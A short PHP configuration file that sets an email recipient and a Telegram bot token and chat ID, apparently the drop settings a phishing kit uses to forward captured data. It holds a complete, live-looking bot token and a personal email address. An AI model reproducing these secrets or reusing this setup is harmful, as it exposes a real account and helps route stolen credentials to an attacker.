<?php

// INFO EMAIL
$to = "j.alkaser@yandex.com";

// INFO TELEGRAM
$token = "6651635715:AAHSmXfOMePp2U3x96LSyaH8Jjn7x23hygg";
$chat_id = "-100190223776";
?>